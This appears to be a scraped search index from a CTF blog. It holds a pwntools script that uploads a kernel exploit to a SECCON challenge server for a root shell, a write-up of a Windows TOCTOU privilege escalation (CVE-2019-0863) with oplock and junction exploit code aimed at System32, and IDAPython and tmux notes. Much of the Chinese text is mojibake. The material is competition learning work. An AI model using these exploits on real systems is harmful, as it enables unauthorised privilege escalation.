with open(\"./exp\", \"rb\") as f: exp = base64.b64encode(f.read()) def do_pow(r): cmd = r.recvline()[:-1] rr = os.popen(cmd.decode()) r.sendline(rr.read()) p = remote('babypf.seccon.games',9009) do_pow(p) try_count = 1 while True: log.info(\"no.\" + str(try_count) + \" time(s)\") p.sendline() p.recvuntil(\"/ $\") count = 0 for i in range(0, len(exp), 0x200): p.sendline(\"echo -n \\\"\" + exp[i:i + 0x200].decode() + \"\\\" \u003e\u003e /tmp/b64_exp\") count += 1 for i in range(count): p.recvuntil(\"/ $\") p.sendline(\"cat /tmp/b64_exp | base64 -d \u003e /tmp/exploit\") p.sendline(\"chmod +x /tmp/exploit\") randomization = (try_count % 1024) * 0x100000 log.info('trying randomization: ' + hex(randomization)) if not p.recvuntil(b\"Rebooting in 1 seconds..\", timeout=20): break log.warn('failed!') try_count += 1 log.success('success to get the root shell!') p.interactive() ","date":"2023-09-25","objectID":"/misc/:10:0","tags":["misc"],"title":"Misc","uri":"/misc/"},{"categories":["misc"],"content":"debug # debug.sh gdb qemu-system-x86_64 --pid `ps -ef | grep qemu | awk '{print $2}' | head -n 1` -x ./debug.source # debug.source b *addr c ","date":"2023-09-25","objectID":"/misc/:11:0","tags":["misc"],"title":"Misc","uri":"/misc/"},{"categories":["misc"],"content":"tmux set-option -g mouse on # å¼€å¯é¼ æ ‡æ”¯æŒ setw -g mode-keys vi # æ”¯æŒviæ¨¡å¼ set-option -s set-clipboard on # å¼€å¯ç³»ç»Ÿå‰ªåˆ‡æ¿æ”¯æŒ ## é¼ æ ‡æ»šè½®æ¨¡æ‹Ÿ # Emulate scrolling by sending up and down keys if these commands are running in the pane tmux_commands_with_legacy_scroll=\"nano less more man\" bind-key -T root WheelUpPane \\ if-shell -Ft= '#{?mouse_any_flag,1,#{pane_in_mode}}' \\ 'send -Mt=' \\ 'if-shell -t= \"#{?alternate_on,true,false} || echo \\\"#{tmux_commands_with_legacy_scroll}\\\" | grep -q \\\"#{pane_current_command}\\\"\" \\ \"send -t= Up Up Up\" \"copy-mode -et=\"' bind-key -T root WheelDownPane \\ if-shell -Ft = '#{?pane_in_mode,1,#{mouse_any_flag}}' \\ 'send -Mt=' \\ 'if-shell -t= \"#{?alternate_on,true,false} || echo \\\"#{tmux_commands_with_legacy_scroll}\\\" | grep -q \\\"#{pane_current_command}\\\"\" \\ \"send -t= Down Down Down\" \"send -Mt=\"' ","date":"2023-09-25","objectID":"/misc/:12:0","tags":["misc"],"title":"Misc","uri":"/misc/"},{"categories":["misc"],"content":"patchelf patchelf --set-interpreter ld_path xxx patchelf --set-rpath libc_dir xxx ","date":"2023-09-25","objectID":"/misc/:13:0","tags":["misc"],"title":"Misc","uri":"/misc/"},{"categories":["pwn"],"content":"L3HCTF2021 PWN èººäº†ä¸ªç¬¬ä¸€ï¼Œè¢«å¸¦é£äº†ã€‚ çœ‹äº†ä¸€ä¸‹åªæœ‰è¿™é¢˜å€¼å¾—è®°å½•ğŸ‘‡ ","date":"2021-11-16","objectID":"/l3hctf2021/:0:0","tags":["pwn","windows"],"title":"L3HCTF2021","uri":"/l3hctf2021/"},{"categories":["pwn"],"content":"vul_service ","date":"2021-11-16","objectID":"/l3hctf2021/:1:0","tags":["pwn","windows"],"title":"L3HCTF2021","uri":"/l3hctf2021/"},{"categories":["pwn"],"content":"åˆ†æ é¢˜ç›®æ¥è‡ªCVE-2019-0863ï¼Œæ³¨å†Œäº†ä¸€ä¸ªç³»ç»ŸæœåŠ¡ï¼ŒåŠŸèƒ½æ˜¯ä¼šä¸æ–­éå†tmpç›®å½•ä¸‹æ–‡ä»¶ï¼Œè¯»å–å…¶æƒé™å¹¶å†™å›å»ï¼Œæ³¨æ„åˆ°æ˜¯æ ¹æ®æ–‡ä»¶åæ¥åˆ¤æ–­å¹¶ä¸”æ²¡æœ‰åŠ é”ï¼Œè€ƒè™‘ä½¿ç”¨TOCTOUæ¥æ”»å‡»ã€‚ å‚è€ƒè¿™ç¯‡æ–‡ç« äº†è§£TOCTOUï¼Œæ¯”è¾ƒå¥½ç†è§£çš„ä¸€ç§æ¡ä»¶ç«äº‰ï¼Œä½¿ç”¨SetOplockåœ¨è¯»å–æ—¶é”ä½ï¼Œå¹¶ä¿®æ”¹ç¬¦å·é“¾æ¥å³å¯éé¢„æœŸä¿®æ”¹åˆ«çš„æ–‡ä»¶çš„æƒé™ã€‚é€šè¿‡è¿™é‡Œä¸»è¦å­¦åˆ°äº†å¾ˆå¤šwindowsçš„çŸ¥è¯†ï¼Œå¦‚æƒé™æ§åˆ¶çš„DACLï¼Œè®¡åˆ’ä»»åŠ¡ç­‰ã€‚ ","date":"2021-11-16","objectID":"/l3hctf2021/:1:1","tags":["pwn","windows"],"title":"L3HCTF2021","uri":"/l3hctf2021/"},{"categories":["pwn"],"content":"æ€è·¯ æ„Ÿè°¢FMYYå’Œ2stçš„å¸®åŠ©ã€‚ é¦–å…ˆåœ¨tmpåŒçº§åˆ›å»ºä¸€ä¸ªtargetç›®å½•ï¼Œå…¶ä¸­åˆ›å»ºåŒåæ–‡ä»¶vul_service.exeï¼Œè¿™é‡Œå»ºè®®ä»system32ä¸­ç›´æ¥å¤åˆ¶å‡ºæ¥å¹¶åˆ é™¤ç»§æ‰¿å…³ç³»ï¼Œè¿™æ ·å°±æœ‰äº†Attackerçš„æƒé™ã€‚ ä¸»è¦æ€è·¯å°±æ˜¯åœ¨tmpåˆ›å»ºä¸€ä¸ªç¬¦å·é“¾æ¥æŒ‡targetï¼Œç”¨SetOplocké”ä½è¯¥åŒåæ–‡ä»¶ã€‚å½“è®¡åˆ’ä»»åŠ¡è®¿é—®æ—¶ï¼Œåˆ é™¤ç¬¦å·é“¾æ¥å¹¶åˆ›å»ºä¸€ä¸ªæŒ‡å‘system32çš„ï¼Œå°±å¯ä»¥æŠŠæƒé™å†™ç»™System32ä¸­çš„æ¼æ´ç¨‹åºï¼Œç„¶åæ›¿æ¢ä¸ºåå¼¹shellçš„æ¶æ„ä»£ç å³å¯ã€‚ ","date":"2021-11-16","objectID":"/l3hctf2021/:1:2","tags":["pwn","windows"],"title":"L3HCTF2021","uri":"/l3hctf2021/"},{"categories":["pwn"],"content":"exp #include \"stdafx.h\" #include\u003ctchar.h\u003e #include\u003cstrsafe.h\u003e #include \"TcpClient.h\" static FileOpLock* oplock = nullptr; static bstr_t target_2; #define BUFSIZE 4096 void HandleOplock() { DebugPrintf(\"OpLock Triggered\"); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(\u0026si, sizeof(STARTUPINFO)); ZeroMemory(\u0026pi, sizeof(PROCESS_INFORMATION)); si.cb = sizeof(STARTUPINFO); RemoveDirectoryW(L\"C:\\\\Users\\\\Public\\\\tmp\\\\1\"); WCHAR CMDLine[BUFSIZE]; ZeroMemory(CMDLine, BUFSIZE); StringCchCat(CMDLine, BUFSIZE, L\"cmd /c mklink /J C:\\\\Users\\\\Public\\\\tmp\\\\1 C:\\\\Windows\\\\System32\"); CreateProcess(nullptr, CMDLine, nullptr, nullptr, FALSE, 0, nullptr, nullptr, \u0026si, \u0026pi); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); Sleep(2000); } int _tmain(int argc, _TCHAR* argv[]) { wprintf_s(L\"[+] hrnPA !\\n\"); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(\u0026si, sizeof(STARTUPINFO)); ZeroMemory(\u0026pi, sizeof(PROCESS_INFORMATION)); si.cb = sizeof(STARTUPINFO); RemoveDirectoryW(L\"C:\\\\Users\\\\Public\\\\tmp\\\\1\"); WCHAR CMDLine[BUFSIZE]; ZeroMemory(CMDLine, BUFSIZE); StringCchCat(CMDLine, BUFSIZE, L\"cmd /c mklink /J C:\\\\Users\\\\Public\\\\tmp\\\\1 C:\\\\Users\\\\Public\\\\target\"); CreateProcess(nullptr, CMDLine, nullptr, nullptr, FALSE, 0, nullptr, nullptr, \u0026si, \u0026pi); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); //Sleep(2000); int sign = 0; if (argc \u003c 2) { printf(\"Usage: SetOpLock target [rwdx]\\n\"); printf(\"Share Mode:\\n\"); printf(\"r - FILE_SHARE_READ\\n\"); printf(\"w - FILE_SHARE_WRITE\\n\"); printf(\"d - FILE_SHARE_DELETE\\n\"); printf(\"x - Exclusive lock\\n\"); sign = 1; } else { LPCWSTR target = argv[1]; LPCWSTR share_mode = argc \u003e 2 ? argv[2] : L\"\"; oplock = FileOpLock::CreateLock(target, share_mode, HandleOplock); if (oplock != nullptr) { oplock-\u003eWaitForLock(INFINITE); delete oplock; } else { printf(\"Error creating oplock\\n\"); return 1; } } if (sign) { TcpClient tcpClient; int iRes = 0; wprintf_s(L\"[+] Trigger launched.\\n\"); wprintf_s(L\"[*] TCP connecting...\\n\"); wprintf_s(L\"[*] Waiting for the VulService to be Execute...\\n\"); Sleep(50000); iRes = tcpClient.connectTCP(\"127.0.0.1\", \"1337\"); if (iRes != 0) { wprintf_s(L\"[*] Retrying ...\\n\"); iRes = tcpClient.connectTCP(\"127.0.0.1\", \"1337\"); } if (iRes != 0) { wprintf_s(L\"[*] Retrying ...\\n\"); iRes = tcpClient.connectTCP(\"127.0.0.1\", \"1337\"); } if (iRes != 0) { wprintf_s(L\"[-] Exploit failed.\"); } else { wprintf_s(L\"[+] Exploit successfull.\"); } } return 0; } æ•ˆæœå¦‚ä¸‹ï¼š æ­¤æ—¶æ›¿æ¢ä¸ºåå¼¹shellçš„æ¶æ„ä»£ç å³å¯ã€‚ ","date":"2021-11-16","objectID":"/l3hctf2021/:1:3","tags":["pwn","windows"],"title":"L3HCTF2021","uri":"/l3hctf2021/"},{"categories":["reverse"],"content":"idapython ä»-1å¼€å§‹å­¦ä¹ idaã€‚ å…¨éƒ¨æŠ„è‡ªã€ŠIDAPython åˆå­¦è€…æŒ‡å—ã€‹ï¼Œæ‰‹åŠ¨ç¿»è¯‘æˆäº†ida7.5+python3ã€‚ ","date":"2021-03-01","objectID":"/idapython/:0:0","tags":["reverse"],"title":"idapythonç¬”è®°","uri":"/idapython/"},{"categories":["reverse"],"content":"æŒ‡ä»¤å­¦ä¹  ","date":"2021-03-01","objectID":"/idapython/:1:0","tags":["reverse"],"title":"idapythonç¬”è®°","uri":"/idapython/"},{"categories":["reverse"],"content":"èŠ‚åŒºæ“ä½œ ea = idc.get_screen_ea() ea = here() # å‡½æ•°è·å–å½“å‰åœ°å€ ida_ida.inf_get_min_ea() ida_ida.inf_get_max_ea() # è·å–å½“å‰æ–‡ä»¶çš„æœ€å¤§ã€å°åœ°å€ idc.get_segm_name(ea) # get text idc.GetDisasm(ea) # get disassembly idc.print_insn_mnem(ea) # get mnemonic idc.print_operand(ea, 0) # get first operand idc.print_operand(ea, 1) # get second operand ä¸€ä¸ªä¾‹å­ add rsp, 8 idc.print_insn_mnem(ea) --\u003e add idc.print_operand(ea, 0) --\u003e rsp idc.print_operand(ea, 1) --\u003e 8 æœ‰äº›æ—¶å€™æˆ‘ä»¬å¿…é¡»ç¡®è®¤ä¸€ä¸ªåœ°å€æ˜¯å¦åœ¨å½“å‰çš„ç¨‹åºä¸­å­˜åœ¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨idaapi.BADADDR æˆ–è€… BADADDR æ¥ç¡®è®¤è¯¥åœ°å€ã€‚ idaapi.BADADDR if BADADDR != here(): print(\"valid address\") # ä»éå†æ‰€æœ‰æ®µ import idautils for seg in idautils.Segments(): print(idc.get_segm_name(seg),idc.get_segm_start(seg),idc.get_segm_end(seg)) idc.get_next_seg(ea) # è·å–å½“å‰åœ°å€æ‰€åœ¨æ®µçš„ä¸‹ä¸€ä¸ªæ®µçš„èµ·å§‹åœ°å€ selector_by_name(\".text\") # è¿”å›basçš„å€¼ï¼Œä¹Ÿå°±æ˜¯åŒºæ®µçš„åºå· get_segm_by_sel(selector_by_name(\".text\")) # ç»„åˆæŠ€è·å¾—textæ®µèµ·å§‹åœ°å€ ","date":"2021-03-01","objectID":"/idapython/:1:1","tags":["reverse"],"title":"idapythonç¬”è®°","uri":"/idapython/"},{"categories":["reverse"],"content":"å‡½æ•° # ä½•éå†æ‰€æœ‰çš„æ®µä¸­çš„æ‰€æœ‰å‡½æ•° for func in idautils.Functions(): print(hex(func), idc.get_func_name(func)) idc.get_func_name(func) # é€šè¿‡æŸä¸ªåœ°å€è·å–å‡½æ•°çš„åç§° func = idaapi.get_func(ea) type(func) # \u003cclass 'idaapi.func_t'\u003e print(\"Start: 0x%x, End: 0x%x\" % (func.start_ea, func.end_ea)) # Start: 0xe79, End: 0x1078 dir(func) # æ¥è·å–è¿™ä¸ªç±»ç©¶ç«Ÿæœ‰å“ªäº›å±æ€§å¯ä»¥ä½¿ç”¨ idc.get_next_func(ea) idc.get_prev_func(ea) # è·å–å½“å‰å‡½æ•°çš„å‰ä¸€ä¸ªæˆ–è€…åä¸€ä¸ªå‡½æ•° ","date":"2021-03-01","objectID":"/idapython/:1:2","tags":["reverse"],"title":"idapythonç¬”è®°","uri":"/idapython/"},{"categories":["reverse"],"content":"æ•°æ® # è·å–æ•°æ® # è·å–å½“å‰å‡½æ•°çš„åæ±‡ç¼– start = idc.get_func_attr(ea, FUNCATTR_START) end = idc.get_func_attr(ea, FUNCATTR_END) # è·å–æŸä¸ªå‡½æ•°çš„é¦–å°¾åœ°å€ cur_addr = start while cur_addr \u003c= end: print(hex(cur_addr), idc.GetDisasm(cur_addr)) cur_addr = idc.next_head(cur_addr, end) è¿™ç§æ–¹æ³•çš„ä¸€ä¸ªç¼ºé™·æ˜¯å®ƒä¾èµ–äºæŒ‡ä»¤è¢«åŒ…å«åœ¨å‡½æ•°å¼€å§‹å’Œç»“æŸçš„è¾¹ç•Œå†…ã€‚æ‰“ä¸ªæ¯”æ–¹è¯´ï¼Œå‡½æ•°å†…æœ‰ä¸ª jmp æŒ‡ä»¤ï¼Œå®ƒè·³è½¬åˆ°æ¯”è¿™ä¸ªå‡½æ•°ç»“æŸåœ°å€è¿˜è¦é«˜çš„åœ°å€ä¸­å»ï¼Œæ„æ€æ˜¯è¿™ä¸ªå‡½æ•°çš„æ‰€æœ‰æŒ‡ä»¤å¯èƒ½å¹¶ä¸æ˜¯çº¿æ€§çš„ï¼Œå®ƒå¯èƒ½ä¼šé€šè¿‡jmp è·³å‡ºå‡½æ•°è¾¹ç•Œ(èµ·å§‹åœ°å€å’Œç»“æŸåœ°å€)ï¼Œä½†å…¶å®è¿™æ®µæŒ‡ä»¤ä»æ˜¯å±äºè¿™ä¸ªå‡½æ•°çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨ä¸Šè¿°çš„æ–¹æ³•å°±ä¸èƒ½å¤Ÿéå†åˆ°è¯¥å‡½æ•°è¦æ‰§è¡Œçš„æ‰€æœ‰æŒ‡ä»¤ã€‚è¿™ç§è·³è½¬åœ¨ä»£ç æ··æ·†ä¸­éå¸¸çš„å¸¸è§ï¼Œæ‰€ä»¥è¯´æˆ‘ä»¬æœ€å¥½è¿˜æ˜¯ä½¿ç”¨ idautils.FuncItems(ea) æ¥å¾ªç¯å‡½æ•°å†…çš„æŒ‡ä»¤ã€‚ ä¿¡æ¯æ”¶é›†å‡½æ•°idc.get_func_attr(func, FUNCATTR_FLAGS)å¯ä»¥ç”¨æ¥æ£€ç´¢å…³äºå‡½æ•°çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å®ƒæ˜¯å¦æ˜¯åº“ä¸­ä»£ç ï¼Œæˆ–è€…å‡½æ•°æ˜¯å¦æœ‰è¿”å›å€¼ç­‰ã€‚å¯¹äºä¸€ä¸ªå‡½æ•°æ¥è¯´æœ‰ä¹ä¸ªå¯èƒ½çš„æ ‡å¿—ã€‚ for func in idautils.Functions(): flags = idc.get_func_attr(func, FUNCATTR_FLAGS) if flags \u0026 FUNC_NORET: print(hex(func), get_func_name(func), \"FUNC_NORET\") if flags \u0026 FUNC_FAR: print(hex(func), get_func_name(func),\"FUNC_FAR\") if flags \u0026 FUNC_LIB: print(hex(func), get_func_name(func),\"FUNC_LIB\") if flags \u0026 FUNC_STATIC: print(hex(func), get_func_name(func),\"FUNC_STATIC\") if flags \u0026 FUNC_FRAME: print(hex(func), get_func_name(func),\"FUNC_FRAME\") if flags \u0026 FUNC_USERFAR: print(hex(func), get_func_name(func),\"FUNC_USERFAR\") if flags \u0026 FUNC_HIDDEN: print(hex(func), get_func_name(func),\"FUNC_HIDDEN\") if flags \u0026 FUNC_THUNK: print(hex(func), get_func_name(func),\"FUNC_THUNK\") if flags \u0026 FUNC_LIB: print(hex(func), get_func_name(func),\"FUNC_BOTTOMBP\") æˆ‘ä»¬åˆ©ç”¨äº† idautils.Fucntions() æ¥è·å–æ‰€æœ‰å·²çŸ¥çš„å‡½æ•°é¦–åœ°å€ï¼Œç„¶ååˆ©ç”¨idc.get_func_attr(func, FUNCATTR_FLAGS)è·å–æ ‡å¿—ã€‚ ","date":"2021-03-01","objectID":"/idapython/:1:3","tags":["reverse"],"title":"idapythonç¬”è®°","uri":"/idapython/"},{"categories":["reverse"],"content":"Flags FUNC_NORETï¼šè¿™ä¸ªæ ‡å¿—è¡¨ç¤ºæŸä¸ªå‡½æ•°æ˜¯å¦æœ‰è¿”å›å€¼ï¼Œå®ƒæœ¬èº«çš„å€¼æ˜¯ 1ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªæ²¡æœ‰è¿”å›å€¼çš„å‡½æ•°ï¼Œæ³¨æ„å®ƒæ²¡æœ‰å‡½æ•°çš„æœ€åå¹¶ä¸æ˜¯ ret æˆ–è€… leave æŒ‡ä»¤ã€‚ FUNC_FARï¼šè¿™ä¸ªæ ‡å¿—éå¸¸å°‘çš„å‡ºç°ï¼Œæ ‡å¿—ç¨‹åºæ˜¯å¦ä½¿ç”¨åˆ†æ®µå†…å­˜ï¼Œå®ƒçš„å€¼ä¸º 2ã€‚ FUNC_USERFARï¼šå°‘è§+1 FUNC_LIBï¼šè¿™ä¸ªè¡¨ç¤ºç”¨äºå¯»æ‰¾åº“å‡½æ•°çš„ä»£ç ã€‚è¯†åˆ«åº“å‡½æ•°ä»£ç æ˜¯éå¸¸æœ‰å¿…è¦çš„ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨åˆ†æçš„æ—¶å€™ä¸€èˆ¬å°†å…¶è·³è¿‡ï¼Œå®ƒçš„å€¼æ˜¯ 4ã€‚ ä¸€ä¸ªFUNC_LIBçš„Demo: for func in idautils.Functions(): flags = idc.get_func_attr(func, FUNCATTR_FLAGS) # print(get_func_name(func), hex(flags)) if flags \u0026 FUNC_LIB: print(hex(func), \"FUNC_LIB\", get_func_name(func)) FUNC_STATICï¼šé™æ€å‡½æ•° FUNC_FRAMEï¼šè¿™ä¸ªæ ‡å¿—è¡¨ç¤ºå‡½æ•°æ˜¯å¦ä½¿ç”¨äº† ebp å¯„å­˜å™¨(å¸§æŒ‡é’ˆ)ï¼Œä½¿ç”¨ ebp å¯„å­˜å™¨çš„å‡½æ•°é€šå¸¸æœ‰å¦‚ä¸‹çš„è¯­æ³•è®¾å®šï¼Œç›®çš„æ˜¯ä¸ºäº†ä¿å­˜æ ˆå¸§ã€‚ FUNC_BOTTOMBPï¼šå’Œ FUNC_FRAME ä¸€æ ·ï¼Œè¯¥æ ‡å¿—ç”¨äºè·Ÿè¸ªå¸§æŒ‡é’ˆ(ebp)ã€‚å®ƒä½œç”¨æ˜¯è¯†åˆ«å‡½æ•°ä¸­å¸§æŒ‡é’ˆæ˜¯ å¦ç­‰äºå †æ ˆæŒ‡é’ˆ(esp)ã€‚ FUNC_HIDDENï¼šå¸¦æœ‰ FUNC_HIDDEN æ ‡å¿—çš„å‡½æ•°æ„å‘³ç€å®ƒä»¬æ˜¯éšè—çš„ï¼Œè¿™ä¸ªå‡½æ•°éœ€è¦å±•å¼€æ‰èƒ½æŸ¥çœ‹ã€‚å¦‚ æœæˆ‘ä»¬è·³è½¬åˆ°ä¸€ä¸ªæ ‡è®°ä¸º HIDDEN çš„åœ°å€çš„è¯ï¼Œå®ƒä¼šè‡ªåŠ¨çš„å±•å¼€ã€‚ FUNC_THUNKï¼šè¡¨ç¤ºè¿™ä¸ªå‡½æ•°æ˜¯å¦æ˜¯ä¸€ä¸ª thunk å‡½æ•°ï¼Œthunk å‡½æ•°è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªç®€å•çš„è·³è½¬å‡½æ•°ã€‚ ","date":"2021-03-01","objectID":"/idapython/:1:4","tags":["reverse"],"title":"idapythonç¬”è®°","uri":"/idapython/"},{"categories":["reverse"],"content":"æŒ‡ä»¤ è·å–è¯¥å‡½æ•°ä¸­æ‰€æœ‰æŒ‡ä»¤åœ°å€çš„é›†åˆ dism_addr = list(idautils.FuncItems(here())) for line in dism_addr: print(hex(line), idc.GetDisasm(line)) å‡½æ•°idautils.FuncItems(ea)å®é™…ä¸Šè¿”å›çš„æ˜¯ä¸€ä¸ªè¿­ä»£å™¨ï¼Œä½†æ˜¯æˆ‘ä»¬å°†å®ƒå¼ºåˆ¶è½¬æ¢ä¸º list ç±»å‹ã€‚è¿™ä¸ª list ä»¥ä¸€ç§è¿ç»­çš„æ–¹å¼å­˜å‚¨ç€æ‰€æœ‰æŒ‡ä»¤çš„èµ·å§‹åœ°å€ã€‚ç°åœ¨æˆ‘ä»¬å·²ç»å®Œå…¨æŒæ¡äº†å¦‚ä½•å¾ªç¯éå†ç¨‹åºä¸­çš„æ®µï¼Œå‡½æ•°å’ŒæŒ‡ä»¤ï¼Œé‚£æˆ‘ä»¬å°±å¼€å§‹ show ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„ä¾‹å­ã€‚æœ‰æ—¶å€™æˆ‘ä»¬ä¼šé€†å‘ä¸€ä¸ªåŠ å£³çš„ä»£ç ï¼Œè¿™æ—¶çŸ¥é“ä»£ç ä¸­å“ªé‡Œè¿›è¡Œäº†åŠ¨æ€è°ƒç”¨å¯¹åˆ†ææ˜¯éå¸¸æœ‰å¸®åŠ©çš„ã€‚ä¸€ä¸ªåŠ¨æ€çš„è°ƒç”¨å¯èƒ½æ˜¯ç”± call æˆ–è€… jump åŠ ä¸Šä¸€ä¸ªæ“ä½œæ•°æ¥å®ç°çš„ï¼Œæ¯”å¦‚è¯´ call eaxï¼Œæˆ–è€… jmp ediã€‚ for func in idautils.Functions(): flags = idc.get_func_attr(func, FUNCATTR_FLAGS) if flags \u0026 FUNC_LIB or flags \u0026 FUNC_THUNK: continue dism_addr = list(idautils.FuncItems(func)) for line in dism_addr: m = idc.print_insn_mnem(line) if m == 'call' or m == 'jmp': op = idc.get_operand_type(line, 0) if op == o_reg: print(\"0x%x %s\" % (line, idc.GetDisasm(line))) æˆ‘ä»¬ä½¿ç”¨ idautils.Functions()è·å–æ‰€æœ‰çš„å‡½æ•°ï¼Œç„¶ååˆ©ç”¨ idc.get_func_attr(ea, FUNCATTR_FLAGS)è·å–æ¯ä¸ªå‡½æ•°çš„æ ‡å¿—ï¼Œå¦‚æœè¿™ä¸ªå‡½æ•°æ˜¯åº“å‡½æ•°æˆ–è€…è¿™ä¸ªå‡½æ•°æ˜¯ thunk å‡½æ•°ï¼Œé‚£æˆ‘ä»¬å°±è·³è¿‡å¯¹å®ƒçš„å¤„ç†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ idautils.FuncItems(ea) è·å–å‡½æ•°ä¸­æ¯ä¸ªæŒ‡å®šçš„èµ·å§‹åœ°å€ã€‚ç„¶åä½¿ç”¨idc.print_insn_mnem(ea)æ¥è·å–æ¯æ¡æŒ‡ä»¤çš„æ“ä½œç¬¦ï¼Œåˆ¤æ–­æ“ä½œç¬¦æ˜¯å¦ä¸º call æˆ–è€… jmpã€‚å¦‚æœæ˜¯çš„è¯ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨ idc.get_operand_type(ea, n)æ¥è·å–æ“ä½œæ•°ï¼Œè¿™ä¸ªå‡½æ•°è¿”å›çš„ä¸€ä¸ª opt.type ç±»å‹çš„æ•°å€¼(int ç±»å‹)ï¼Œè¿™ä¸ªæ•°å€¼å¯è¡¨ç¤ºçš„ç±»å‹ä¸ºå¯„å­˜å™¨ï¼Œå†…å­˜å¼•ç”¨ç­‰ç­‰ã€‚æˆ‘ä»¬æ£€æŸ¥æ¯æ¡ call æˆ–è€… jmpæŒ‡ä»¤çš„æ“ä½œæ•°ï¼Œå¦‚æœæ˜¯å¯„å­˜å™¨çš„è¯å°±æ‰“å°å‡ºè¯¥è¡ŒæŒ‡ä»¤ã€‚ é€šè¿‡å¼ºåˆ¶è½¬æ¢ä¸ºlistæˆ‘ä»¬è·å–äº†æ‰€æœ‰å‡½æ•°çš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥ä½¿ç”¨idc.next_headå’Œidc.prev_headæ¥è·å–é™„è¿‘æŒ‡ä»¤çš„åœ°å€ã€‚æ³¨æ„ï¼Œä¸ä¹‹ç±»ä¼¼çš„ida_bytes.next_addræ˜¯è·å–é™„è¿‘çš„åœ°å€ã€‚ ea = here() print(hex(ea), idc.GetDisasm(ea)) next_instr = idc.next_head(ea) print(hex(next_instr), idc.GetDisasm(next_instr)) ","date":"2021-03-01","objectID":"/idapython/:1:5","tags":["reverse"],"title":"idapythonç¬”è®°","uri":"/idapython/"},{"categories":["reverse"],"content":"æ“ä½œæ•° æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ idc.get_operand_type(ea,n)æ¥è·å–æ“ä½œæ•°ç±»å‹ï¼Œea æ˜¯ä¸€ä¸ªåœ°å€ï¼Œn æ˜¯ä¸€ä¸ªç´¢å¼•ã€‚æ“ä½œæ•°æ€»å…±æœ‰å…«ç§ä¸åŒçš„ç±»å‹ã€‚ o_voidï¼šå¦‚æœæŒ‡ä»¤æ²¡æœ‰ä»»ä½•æ“ä½œæ•°ï¼Œå®ƒå°†è¿”å› 0ã€‚ä¾‹å¦‚retn o_regï¼šå¦‚æœæ“ä½œæ•°æ˜¯å¯„å­˜å™¨ï¼Œåˆ™è¿”å›è¿™ç§ç±»å‹ï¼Œå®ƒçš„å€¼ä¸º 1 o_memï¼šå¦‚æœæ“ä½œæ•°æ˜¯ç›´æ¥å¯»å€çš„å†…å­˜ï¼Œé‚£ä¹ˆè¿”å›è¿™ç§ç±»å‹ï¼Œå®ƒçš„å€¼æ˜¯ 2ï¼Œè¿™ç§ç±»å‹å¯¹å¯»æ‰¾ DATAçš„å¼•ç”¨éå¸¸æœ‰å¸®åŠ©ã€‚ä¾‹å¦‚ cmp ds:dword_A152B8, 0 o_phraseï¼šå¦‚æœæ“ä½œæ•°æ˜¯åˆ©ç”¨åŸºå€å¯„å­˜å™¨å’Œå˜å€å¯„å­˜å™¨çš„å¯»å€æ“ä½œçš„è¯ï¼Œé‚£ä¹ˆè¿”å›è¯¥ç±»å‹ï¼Œå€¼ä¸º 3ã€‚ä¾‹å¦‚mov [edi+ecx], eax o_displï¼šå¦‚æœæ“ä½œæ•°æ˜¯åˆ©ç”¨å¯„å­˜å™¨å’Œä½ç§»çš„å¯»å€æ“ä½œçš„è¯ï¼Œè¿”å›è¯¥ç±»å‹ï¼Œå€¼ä¸º 4ã€‚å¦‚mov eax, [edi+18h] o_immï¼›å¦‚æœæ“ä½œæ•°æ˜¯ä¸€ä¸ªç¡®å®šçš„æ•°å€¼çš„è¯ï¼Œé‚£ä¹ˆè¿”å›ç±»å‹ï¼Œå€¼ä¸º 5ï¼Œå¦‚ add esp, 0Ch o_farï¼šè¿™ç§è¿”å›ç±»å‹åœ¨ x86 å’Œ x86_64 çš„é€†å‘ä¸­ä¸å¸¸è§ã€‚å®ƒç”¨æ¥åˆ¤æ–­ç›´æ¥è®¿é—®è¿œç«¯åœ°å€çš„æ“ä½œæ•°ï¼Œå€¼ä¸º 6 o_nearï¼šè¿™ç§è¿”å›ç±»å‹åœ¨ x86 å’Œ x86_64 çš„é€†å‘ä¸­ä¸å¸¸è§ã€‚å®ƒç”¨æ¥åˆ¤æ–­ç›´æ¥è®¿é—®è¿‘ç«¯åœ°å€çš„æ“ä½œæ•°ï¼Œå€¼ä¸º 7 ä¾‹å­1 è¿™ä¸ªä¾‹å­çš„ç›®çš„æ˜¯åˆ›å»ºä¸€ä¸ª python çš„å­—å…¸ï¼Œå­—å…¸åŒ…å«äº†å¯æ‰§è¡Œæ–‡ä»¶ä¸­ä½¿ç”¨çš„æ‰€æœ‰åç§»é‡ï¼Œè®©åç§»é‡ä½œä¸ºå­—å…¸çš„ keyï¼Œè€Œæ¯ä¸ª key å¯¹åº”çš„ value å­˜å‚¨ç€æ‰€æœ‰ä½¿ç”¨è¯¥åç§»é‡çš„åœ°å€ã€‚ import idautils import idaapi displace = {} # for each known function for func in idautils.Functions(): flags = idc.get_func_attr(func, FUNCATTR_FLAGS) # skip library \u0026 thunk functions if flags \u0026 FUNC_LIB or flags \u0026 FUNC_THUNK: continue dism_addr = list(idautils.FuncItems(func)) for curr_addr in dism_addr: op = None index = None insn = ida_ua.insn_t() # same as idc.GetOptype, just a different way of accessing the types idaapi.decode_insn(insn, curr_addr) if insn.Op1.type == idaapi.o_displ: op = 1 if insn.Op2.type == idaapi.o_displ: op = 2 if op == None: continue if \"bp\" in idc.print_operand(curr_addr,0) or idc.print_operand(curr_addr, 1): # ebp will return a negative number if op == 1: index = (~(int(insn.Op1.addr) - 1) \u00260xFFFFFFFF) else: index = (~(int(insn.Op2.addr) - 1) \u00260xFFFFFFFF) else: if op == 1: index = int(insn.Op1.addr) else: index = int(insn.Op2.addr) # create key for each unique displacement value if index: if index not in displace: displace[index] = [] displace[index].append(curr_addr) ä»£ç 